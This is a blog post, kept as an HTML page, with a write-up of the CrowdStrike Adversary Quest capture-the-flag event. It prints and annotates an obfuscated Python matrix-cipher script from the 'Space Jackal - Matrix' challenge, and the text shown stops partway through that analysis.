@@ -1,0 +1,1192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>CrowdStrike Adversary Quest CTF :: Noonker — thoughts, guides, etc</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Overview  I recently took part in the Adversary Quest CTF. I utimately got stopped at 5/12 challenges. Thanks to CrowdStrike for an awesome CTF and I look forward to completing it next year. Below are writeups for some of the challenges I was able to complete.
+ I&amp;#39;m excluding The Proclamation from a writeup as this was my solution- this was a very cool challenge so I&amp;#39;m going to refer you to @Vinopaljiri&amp;#39;s excellent writeup." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://noonker.github.io/posts/2021-02-01-crowdstrike-adversary-zone/" />
+
+
+
+
+<link rel="stylesheet" href="https://noonker.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://noonker.github.io/assets/blue.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://noonker.github.io/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://noonker.github.io/img/favicon/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  <meta name="twitter:site" content="https://twitter.com" />
+
+<meta name="twitter:creator" content="" />
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="CrowdStrike Adversary Quest CTF :: Noonker">
+<meta property="og:description" content="Overview  I recently took part in the Adversary Quest CTF. I utimately got stopped at 5/12 challenges. Thanks to CrowdStrike for an awesome CTF and I look forward to completing it next year. Below are writeups for some of the challenges I was able to complete.
+ I&amp;#39;m excluding The Proclamation from a writeup as this was my solution- this was a very cool challenge so I&amp;#39;m going to refer you to @Vinopaljiri&amp;#39;s excellent writeup." />
+<meta property="og:url" content="https://noonker.github.io/posts/2021-02-01-crowdstrike-adversary-zone/" />
+<meta property="og:site_name" content="CrowdStrike Adversary Quest CTF" />
+
+  
+    <meta property="og:image" content="https://noonker.github.io/img/favicon/blue.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2021-02-01 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Terminal
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://noonker.github.io/posts/2021-02-01-crowdstrike-adversary-zone/">CrowdStrike Adversary Quest CTF</a></h1>
+  <div class="post-meta">
+      
+    <span class="post-date">
+      2021-02-01
+    </span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://noonker.github.io/tags/tech/">tech,</a>&nbsp;
+    
+    #<a href="https://noonker.github.io/tags/ctf/">ctf</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  <div class="post-content"><div>
+        
+<div id="outline-container-headline-1" class="outline-2">
+<h2 id="headline-1">
+Overview
+</h2>
+<div id="outline-text-headline-1" class="outline-text-2">
+<p>I recently took part in the <code class="verbatim">Adversary Quest</code> CTF. I utimately got stopped at <code class="verbatim">5/12</code> challenges. Thanks to <a href="https://twitter.com/CrowdStrike">CrowdStrike</a> for an awesome CTF and I look forward to completing it next year. Below are writeups for some of the challenges I was able to complete.</p>
+<p>
+I&#39;m excluding <code class="verbatim">The Proclamation</code> from a writeup as <a href="https://gchq.github.io/CyberChef/#recipe=From_Hexdump()XOR_Brute_Force(1,1000,0,&#39;Standard&#39;,false,true,false,&#39;CS%7B&#39;)&amp;input=MDAwMDAwMCBiYyAwMCAyMCBiNCAwNyAzMCBjMCAzMSBjOSBiNyA4YSBiNiA2MSBiMiA2MSBjZAowMDAwMDEwIDEwIGI0IDAyIDMxIGQyIDMwIGZmIGNkIDEwIGViIDQ2IDVlIDgzIGM2IDE0IGIyCjAwMDAwMjAgMDkgNjYgNTIgYjMgMDAgYjQgMGUgOGEgMDQgODMgYzYgMDEgNjYgNWEgNjYgYzEKMDAwMDAzMCBlMiAwMiA2NiA4MyBjMiA0MiA2NiA4MSBlMiBmZiAwMCAwMCAwMCA2NiAzMSBkMAowMDAwMDQwIDY2IDUyIDBjIDAwIDc0IDE5IDg4IGMyIDgwIGYyIDBhIDc0IDA0IGNkIDEwIGViCjAwMDAwNTAgZDIgYjQgMDMgY2QgMTAgYjQgMDIgZmUgYzYgYjIgMDAgY2QgMTAgZWIgYzQgZmEKMDAwMDA2MCBmNCBlOCBiNyBmZiA3OSA2ZiA3NSAyNyA3MiA2NSAyMCA2ZiA2ZSAyMCA2MSAyMAowMDAwMDcwIDY3IDZmIDZmIDY0IDIwIDc3IDYxIDc5IDJlIGJmIGM2IDg2IDg1IGM0IGNhIGJkCjAwMDAwODAgOGYgY2EgOGIgOTggOGYgY2EgODYgODUgODUgODEgODMgODQgOGQgY2EgOGMgODUKMDAwMDA5MCA5OCBjYSA4MiA4MyA4ZCA4MiA4NiA5MyBjYSA4MyA4NCA5ZSA4ZiA4NiA4NiA4MwowMDAwMGEwIDhkIDhmIDg0IDllIGUwIDgzIDg0IDhlIDgzIDljIDgzIDhlIDlmIDhiIDg2IDk5CjAwMDAwYjAgYzQgY2EgYmUgODUgY2EgOGMgODMgODQgOGUgY2EgOWUgODIgOGYgODcgYzYgY2EKMDAwMDBjMCA5ZCA4ZiBjYSA4MiA4YiA5YyA4ZiBjYSA4ZSA4ZiA5YyA4MyA5OSA4ZiA4ZSBlMAowMDAwMGQwIDhiIGNhIDllIDhmIDk5IDllIGM0IGUwIGUwIGJlIDgyIDhmIDk4IDhmIGNhIDgzCjAwMDAwZTAgOTkgY2EgOGIgY2EgODcgOGYgOTkgOTkgOGIgOGQgOGYgY2EgODIgODMgOGUgOGUKMDAwMDBmMCA4ZiA4NCBjYSA4MyA4NCBjYSA5ZSA4MiA4MyA5OSBjYSA4OCA4NSA4NSA5ZSA4NgowMDAwMTAwIDg1IDhiIDhlIDhmIDk4IGM0IGUwIGUwIGFjIDgzIDg0IDhlIGNhIDgzIDllIGM2CjAwMDAxMTAgY2EgOGIgODQgOGUgY2EgODMgOWUgY2EgOWQgODMgODYgODYgY2EgODYgOGYgOGIKMDAwMDEyMCA4ZSBjYSA5MyA4NSA5ZiBjYSA4NSA4NCBjYSA5ZSA4MiA4ZiBjYSA5OCA4NSA4YgowMDAwMTMwIDhlIGNhIDllIDg1IGUwIDhjIDgzIDg0IDhlIDgzIDg0IDhkIGNhIDlmIDk5IGM0CjAwMDAxNDAgY2EgYmQgOGYgY2EgODYgODUgODUgODEgY2EgOGMgODUgOTggOWQgOGIgOTggOGUKMDAwMDE1MCBjYSA5ZSA4NSBjYSA4NyA4ZiA4ZiA5ZSBjYSA5ZSA4MiA4ZiBlMCA4YyA4ZiA5ZAowMDAwMTYwIGNhIDllIDgyIDhiIDllIGNhIDlkIDgzIDg2IDg2IGNhIDg3IDhiIDgxIDhmIGNhCjAwMDAxNzAgODMgOWUgY2EgOGIgODYgODYgY2EgOWUgODIgOGYgY2EgOWQgOGIgOTMgY2EgOWUKMDAwMDE4MCA4MiA5OCA4NSA5ZiA4ZCA4MiBjNCBlMCBlMCBhZCA4NSA4NSA4ZSBjYSA4NiA5ZgowMDAwMTkwIDg5IDgxIGM2IGNhIDhiIDg0IDhlIGNhIDk4IDhmIDg3IDhmIDg3IDg4IDhmIDk4CjAwMDAxYTAgZDAgZTAgY2EgY2EgY2EgY2EgYmQgOGYgY2EgODYgODUgOWMgOGYgY2EgOTkgOWEKMDAwMDFiMCA4YiA4OSA4ZiA5OSBjYSA4NyA5ZiA4OSA4MiBjYSA4NyA4NSA5OCA4ZiBjYSA5ZQowMDAwMWMwIDgyIDhiIDg0IGNhIDllIDhiIDg4IDk5IGNiIGVhIDgxIDE5IDExIGE5IGI5IDkxCjAwMDAxZDAgZGEgOTggOGUgZDkgOTggYjUgZGEgOGMgYjUgZGEgOTIgZDggZGEgYjUgODggZGEKMDAwMDFlMCBkYSA5ZSA4NiBkYSA4YiA4ZSBkOSA5OCA5NyA5NyBlYSBmNCBmNCBmNCBmNCBmNAowMDAwMWYwIGY0IGY0IGY0IGY0IGY0IGY0IGY0IGY0IGY0IGY0IGY0IGY0IGY0IGY0IDU1IGFhCjAwMDAyMDA">this</a> was my solution- this was a very cool challenge so I&#39;m going to refer you to <a href="https://twitter.com/vinopaljiri?lang=en">@Vinopaljiri</a>&#39;s <a href="https://github.com/Dump-GUY/Malware-analysis-and-Reverse-engineering/blob/main/Debugging%20MBR%20-%20IDA%20+%20Bochs%20Emulator/Debugging%20MBR%20-%20IDA%20+%20Bochs%20Emulator.md">excellent writeup</a>.</p>
+</div>
+</div>
+<div id="outline-container-headline-2" class="outline-2">
+<h2 id="headline-2">
+Challenges
+</h2>
+<div id="outline-text-headline-2" class="outline-text-2">
+<div id="outline-container-headline-3" class="outline-3">
+<h3 id="headline-3">
+Space Jackal - Matrix
+</h3>
+<div id="outline-text-headline-3" class="outline-text-3">
+<blockquote>
+<p>With the help of your analysis, we got onto the trail of the group and found their hidden forum on the Deep Dark Web. Unfortunately, all messages are encrypted. While we believe that we have found their encryption tool, we are unsure how to decrypt these messages. Can you assist?</p>
+</blockquote>
+<p>
+For this challenge we were given a darknet website which could be accessed with <a href="https://www.torproject.org/download/">TOR</a> and a python script which was used to encrypt and decrypt the message.</p>
+<p>
+<img src="/images/crowdstrike-darknet-forum.png" alt="/images/crowdstrike-darknet-forum.png" title="/images/crowdstrike-darknet-forum.png" /></p>
+<div class="src src-python">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+<span style="color:#e6db74">&#39;&#39;&#39;              ,
+</span><span style="color:#e6db74">                /|      ,
+</span><span style="color:#e6db74">   ,--.________/ /-----/|-------------------------------------.._
+</span><span style="color:#e6db74">  (    /_/_/_/_  |--------- DEATH TO ALL TABS ---------------&lt;  _`&gt;
+</span><span style="color:#e6db74">   `--´        \ \-----\|-------------------------------------&#39;&#39;´
+</span><span style="color:#e6db74">                \|      &#39;
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#75715e">#             &#39;</span>
+<span style="color:#66d9ef">assert</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>
+<span style="color:#f92672">import</span> sys
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">die</span>(E):
+    <span style="color:#66d9ef">print</span>(F<span style="color:#e6db74">&#39;E:&#39;</span>,E,file<span style="color:#f92672">=</span>sys<span style="color:#f92672">.</span>stderr)
+    sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+T<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> A,B,C,D,E,F,G,H,I:A<span style="color:#f92672">*</span>E<span style="color:#f92672">*</span>I<span style="color:#f92672">+</span>B<span style="color:#f92672">*</span>F<span style="color:#f92672">*</span>G<span style="color:#f92672">+</span>C<span style="color:#f92672">*</span>D<span style="color:#f92672">*</span>H<span style="color:#f92672">-</span>G<span style="color:#f92672">*</span>E<span style="color:#f92672">*</span>C<span style="color:#f92672">-</span>H<span style="color:#f92672">*</span>F<span style="color:#f92672">*</span>A<span style="color:#f92672">-</span>I<span style="color:#f92672">*</span>D<span style="color:#f92672">*</span>B<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">255</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">U</span>(K):
+    R<span style="color:#f92672">=</span>pow(T(<span style="color:#f92672">*</span>K),<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">256</span>)
+    A,B,C,D,E,F,G,H,I<span style="color:#f92672">=</span>K
+    <span style="color:#66d9ef">return</span> [R<span style="color:#f92672">*</span>V<span style="color:#f92672">%</span><span style="color:#ae81ff">256</span> <span style="color:#66d9ef">for</span> V <span style="color:#f92672">in</span>
+     [E<span style="color:#f92672">*</span>I<span style="color:#f92672">-</span>F<span style="color:#f92672">*</span>H,C<span style="color:#f92672">*</span>H<span style="color:#f92672">-</span>B<span style="color:#f92672">*</span>I,B<span style="color:#f92672">*</span>F<span style="color:#f92672">-</span>C<span style="color:#f92672">*</span>E,F<span style="color:#f92672">*</span>G<span style="color:#f92672">-</span>D<span style="color:#f92672">*</span>I,A<span style="color:#f92672">*</span>I<span style="color:#f92672">-</span>C<span style="color:#f92672">*</span>G,C<span style="color:#f92672">*</span>D<span style="color:#f92672">-</span>A<span style="color:#f92672">*</span>F,D<span style="color:#f92672">*</span>H<span style="color:#f92672">-</span>E<span style="color:#f92672">*</span>G,B<span style="color:#f92672">*</span>G<span style="color:#f92672">-</span>A<span style="color:#f92672">*</span>H,A<span style="color:#f92672">*</span>E<span style="color:#f92672">-</span>B<span style="color:#f92672">*</span>D]]
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">C</span>(K,M):
+    B<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> A,B,C,D,E,F,G,H,I,X,Y,Z:bytes((A<span style="color:#f92672">*</span>X<span style="color:#f92672">+</span>B<span style="color:#f92672">*</span>Y<span style="color:#f92672">+</span>C<span style="color:#f92672">*</span>Z<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFF</span>,
+        D<span style="color:#f92672">*</span>X<span style="color:#f92672">+</span>E<span style="color:#f92672">*</span>Y<span style="color:#f92672">+</span>F<span style="color:#f92672">*</span>Z<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFF</span>,G<span style="color:#f92672">*</span>X<span style="color:#f92672">+</span>H<span style="color:#f92672">*</span>Y<span style="color:#f92672">+</span>I<span style="color:#f92672">*</span>Z<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFF</span>))
+    N<span style="color:#f92672">=</span>len(M)
+    R<span style="color:#f92672">=</span>N<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>
+    R<span style="color:#f92672">=</span>R <span style="color:#f92672">and</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">-</span>R
+    M<span style="color:#f92672">=</span>M<span style="color:#f92672">+</span>R<span style="color:#f92672">*</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(B(<span style="color:#f92672">*</span>K,<span style="color:#f92672">*</span>W) <span style="color:#66d9ef">for</span> W <span style="color:#f92672">in</span> zip(<span style="color:#f92672">*</span>[iter(M)]<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>))<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
+len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">or</span> die(<span style="color:#e6db74">&#39;FOOL&#39;</span>)
+K<span style="color:#f92672">=</span>bytes(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#39;ascii&#39;</span>)
+len(K)<span style="color:#f92672">==</span><span style="color:#ae81ff">9</span> <span style="color:#f92672">and</span> T(<span style="color:#f92672">*</span>K)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">or</span> die(<span style="color:#e6db74">&#39;INVALID&#39;</span>)
+M<span style="color:#f92672">=</span>sys<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>read()
+<span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>upper() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;E&#39;</span>:
+    M<span style="color:#f92672">=</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;SPACEARMY&#39;</span><span style="color:#f92672">+</span>bytes(M,<span style="color:#e6db74">&#39;ascii&#39;</span>)
+    <span style="color:#66d9ef">print</span>(C(U(K),M)<span style="color:#f92672">.</span>hex()<span style="color:#f92672">.</span>upper())
+<span style="color:#66d9ef">else</span>:
+    M<span style="color:#f92672">=</span>C(K,bytes<span style="color:#f92672">.</span>fromhex(M))
+    M[:<span style="color:#ae81ff">9</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;SPACEARMY&#39;</span> <span style="color:#f92672">or</span> die(<span style="color:#e6db74">&#39;INVALID&#39;</span>)
+    <span style="color:#66d9ef">print</span>(M[<span style="color:#ae81ff">9</span>:]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>))</code></pre></div>
+</div>
+<p>
+The first thing I did to start understanding this is to start formatting, renaming, and commenting the code. This is what it looked like after I was done with that.</p>
+<div class="src src-python">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#75715e"># -*- coding: utf-8 -*-</span>
+<span style="color:#e6db74">&#39;&#39;&#39;              ,
+</span><span style="color:#e6db74">                /|      ,
+</span><span style="color:#e6db74">   ,--.________/ /-----/|-------------------------------------.._
+</span><span style="color:#e6db74">  (    /_/_/_/_  |--------- DEATH TO ALL TABS ---------------&lt;  _`&gt;
+</span><span style="color:#e6db74">   `--´        \ \-----\|-------------------------------------&#39;&#39;´
+</span><span style="color:#e6db74">                \|      &#39;
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#75715e">#             &#39;</span>
+<span style="color:#66d9ef">assert</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>
+<span style="color:#f92672">import</span> sys
+<span style="color:#f92672">import</span> binascii
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">die</span>(E):
+    <span style="color:#66d9ef">print</span>(F<span style="color:#e6db74">&#39;E:&#39;</span>,E,file<span style="color:#f92672">=</span>sys<span style="color:#f92672">.</span>stderr)
+    sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+
+<span style="color:#75715e"># T takes 9 args and returns a value between 0 and 255</span>
+T<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> A,B,C,D,E,F,G,H,I:A<span style="color:#f92672">*</span>E<span style="color:#f92672">*</span>I<span style="color:#f92672">+</span>B<span style="color:#f92672">*</span>F<span style="color:#f92672">*</span>G<span style="color:#f92672">+</span>C<span style="color:#f92672">*</span>D<span style="color:#f92672">*</span>H<span style="color:#f92672">-</span>G<span style="color:#f92672">*</span>E<span style="color:#f92672">*</span>C<span style="color:#f92672">-</span>H<span style="color:#f92672">*</span>F<span style="color:#f92672">*</span>A<span style="color:#f92672">-</span>I<span style="color:#f92672">*</span>D<span style="color:#f92672">*</span>B<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">255</span>
+
+<span style="color:#75715e"># The purpose of this may be to limit the keyspace.</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">U</span>(K):
+    <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    K is a list that gets unpacked
+</span><span style="color:#e6db74">    9 bytes in and 9 bytes out
+</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+    R<span style="color:#f92672">=</span>pow(T(<span style="color:#f92672">*</span>K),<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">256</span>) <span style="color:#75715e"># only works for odd numbs</span>
+    A,B,C,D,E,F,G,H,I<span style="color:#f92672">=</span>K
+    <span style="color:#66d9ef">return</span> [R<span style="color:#f92672">*</span>V<span style="color:#f92672">%</span><span style="color:#ae81ff">256</span> <span style="color:#66d9ef">for</span> V <span style="color:#f92672">in</span> [E<span style="color:#f92672">*</span>I<span style="color:#f92672">-</span>F<span style="color:#f92672">*</span>H,
+                              C<span style="color:#f92672">*</span>H<span style="color:#f92672">-</span>B<span style="color:#f92672">*</span>I,
+                              B<span style="color:#f92672">*</span>F<span style="color:#f92672">-</span>C<span style="color:#f92672">*</span>E,
+                              F<span style="color:#f92672">*</span>G<span style="color:#f92672">-</span>D<span style="color:#f92672">*</span>I,
+                              A<span style="color:#f92672">*</span>I<span style="color:#f92672">-</span>C<span style="color:#f92672">*</span>G,
+                              C<span style="color:#f92672">*</span>D<span style="color:#f92672">-</span>A<span style="color:#f92672">*</span>F,
+                              D<span style="color:#f92672">*</span>H<span style="color:#f92672">-</span>E<span style="color:#f92672">*</span>G,
+                              B<span style="color:#f92672">*</span>G<span style="color:#f92672">-</span>A<span style="color:#f92672">*</span>H,
+                              A<span style="color:#f92672">*</span>E<span style="color:#f92672">-</span>B<span style="color:#f92672">*</span>D]]
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">C</span>(K,M):
+    <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">    Essentially a substitution cypher
+</span><span style="color:#e6db74">    M is STDIN
+</span><span style="color:#e6db74">    K is 9 bytes passed to function
+</span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
+
+    <span style="color:#75715e"># A - I is constant for this function because they are the bytes of K</span>
+
+    <span style="color:#75715e"># Generate 3 bytes</span>
+    B<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> A,B,C,D,E,F,G,H,I,X,Y,Z:bytes((A<span style="color:#f92672">*</span>X<span style="color:#f92672">+</span>B<span style="color:#f92672">*</span>Y<span style="color:#f92672">+</span>C<span style="color:#f92672">*</span>Z<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFF</span>,
+                                       D<span style="color:#f92672">*</span>X<span style="color:#f92672">+</span>E<span style="color:#f92672">*</span>Y<span style="color:#f92672">+</span>F<span style="color:#f92672">*</span>Z<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFF</span>,
+                                       G<span style="color:#f92672">*</span>X<span style="color:#f92672">+</span>H<span style="color:#f92672">*</span>Y<span style="color:#f92672">+</span>I<span style="color:#f92672">*</span>Z<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xFF</span>))
+
+    <span style="color:#75715e"># This adds padded \0 bytes to the end of STDIN to align it to 3 bytes</span>
+    N<span style="color:#f92672">=</span>len(M)
+    R<span style="color:#f92672">=</span>N<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>
+    R<span style="color:#f92672">=</span>R <span style="color:#f92672">and</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">-</span>R
+    M<span style="color:#f92672">=</span>M<span style="color:#f92672">+</span>R<span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>
+
+    <span style="color:#75715e"># zip(*[iter(M)]*3) turns a bytes object into an iterator that yields 3 bytes at a time</span>
+    <span style="color:#75715e">#   so the results of this get threaded into X,Y,Z</span>
+    <span style="color:#75715e"># K gets threaded into A-I of B</span>
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(B(<span style="color:#f92672">*</span>K,<span style="color:#f92672">*</span>W) <span style="color:#66d9ef">for</span> W <span style="color:#f92672">in</span> zip(<span style="color:#f92672">*</span>[iter(M)]<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>))<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
+
+
+len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">or</span> die(<span style="color:#e6db74">&#39;FOOL&#39;</span>) <span style="color:#75715e"># Python won&#39;t evaluate the OR conditional</span>
+                                <span style="color:#75715e"># if the first is false. So this is the same as</span>
+                                <span style="color:#75715e"># If len(sys.argv) not 3 then quit</span>
+
+K<span style="color:#f92672">=</span>bytes(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#39;ascii&#39;</span>)   <span style="color:#75715e"># Turn the second arg into a bytes object</span>
+
+len(K)<span style="color:#f92672">==</span><span style="color:#ae81ff">9</span> <span style="color:#f92672">and</span> T(<span style="color:#f92672">*</span>K)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">or</span> die(<span style="color:#e6db74">&#39;INVALID&#39;</span>) <span style="color:#75715e"># DIE is a fail case here- T(*K) should be even</span></code></pre></div>
+</div>
+<p>
+The second step was to understand how the baddies would use the script to get an understanding for roughly how it was going to work:</p>
+<div class="src src-python">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">or</span> die(<span style="color:#e6db74">&#39;FOOL&#39;</span>) <span style="color:#75715e"># Python won&#39;t evaluate the OR conditional</span>
+                                <span style="color:#75715e"># if the first is false. So this is the same as</span>
+                                <span style="color:#75715e"># If len(sys.argv) not 3 then quit</span>
+
+K<span style="color:#f92672">=</span>bytes(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#39;ascii&#39;</span>)   <span style="color:#75715e"># Turn the second arg into a bytes object</span>
+
+len(K)<span style="color:#f92672">==</span><span style="color:#ae81ff">9</span> <span style="color:#f92672">and</span> T(<span style="color:#f92672">*</span>K)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">or</span> die(<span style="color:#e6db74">&#39;INVALID&#39;</span>) <span style="color:#75715e"># DIE is a fail case here- T(*K) should be even</span>
+
+<span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>upper() <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;E&#39;</span>: <span style="color:#75715e"># If the first arg is E we&#39;re going to use the second arg</span>
+                              <span style="color:#75715e"># as a key</span>
+    M<span style="color:#f92672">=</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;SPACEARMY&#39;</span><span style="color:#f92672">+</span>bytes(M,<span style="color:#e6db74">&#39;ascii&#39;</span>) <span style="color:#75715e"># Prepend the key SPACEARMY to the PLAINTEXT</span>
+    <span style="color:#66d9ef">print</span>(C(U(K),M)<span style="color:#f92672">.</span>hex()<span style="color:#f92672">.</span>upper()) <span style="color:#75715e"># And call this encryption method</span>
+<span style="color:#66d9ef">else</span>:
+    M<span style="color:#f92672">=</span>C(K,bytes<span style="color:#f92672">.</span>fromhex(M))
+    M[:<span style="color:#ae81ff">9</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;SPACEARMY&#39;</span> <span style="color:#f92672">or</span> die(<span style="color:#e6db74">&#39;INVALID&#39;</span>)
+    <span style="color:#66d9ef">print</span>(M[<span style="color:#ae81ff">9</span>:]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>))</code></pre></div>
+</div>
+<p>
+The <code class="verbatim">else</code> case in this seemed to be a checker for some key to make sure it decrypted to the correct plaintext.</p>
+<p>
+The next step was to understand how the different methods <code class="verbatim">C(U(K),M).hex().upper()</code> worked.</p>
+<p>
+The function <code class="verbatim">U</code> seems to take 9 bytes in and return 9 bytes out. It is called on the key passed to <code class="verbatim">C</code> only on encryption- so for encryption/decryption it was safe to say I could ignore this except to say that there&#39;s probably a key that can be passed to <code class="verbatim">U</code> that is simpler than the byte array that is the eventual key.</p>
+<p>
+So that left me with understanding <code class="verbatim">C</code>. The simple part of <code class="verbatim">C</code> takes the user&#39;s plaintext and pads it to 3 bytes with <code class="verbatim">0x00</code>. It then produces a generator function which takes in 3 bytes of data, applies <code class="verbatim">B</code> to the bytes with the key <code class="verbatim">K</code> and yields 3 bytes of cyphertext.</p>
+<div class="src src-python">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    N<span style="color:#f92672">=</span>len(M)
+    R<span style="color:#f92672">=</span>N<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>
+    R<span style="color:#f92672">=</span>R <span style="color:#f92672">and</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">-</span>R
+    M<span style="color:#f92672">=</span>M<span style="color:#f92672">+</span>R<span style="color:#f92672">*</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>
